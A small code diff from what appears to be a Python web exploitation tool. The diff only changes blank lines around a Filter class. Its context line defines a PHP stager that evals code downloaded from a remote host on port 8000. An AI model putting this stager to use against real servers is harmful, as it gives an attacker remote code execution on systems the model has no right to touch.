@@ -6,9 +6,9 @@ from .Detection import Detection
 
 STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
 
+
 class Filter:
     def __init__(self, args):
-
         self.target = args.url
         self.cookies = args.cookies
         self.detection = args.detection
